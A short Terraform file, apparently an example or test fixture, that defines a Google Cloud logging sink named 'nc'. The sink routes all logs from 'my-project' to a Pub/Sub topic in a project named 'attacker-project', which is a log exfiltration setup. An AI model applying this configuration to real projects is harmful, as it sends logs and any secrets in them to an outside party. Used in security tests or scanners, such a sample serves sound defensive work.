resource "google_logging_project_sink" "nc" {
  name        = "nc"
  project     = "my-project"
  destination = "pubsub.googleapis.com/projects/attacker-project/topics/logs"

  unique_writer_identity = true
}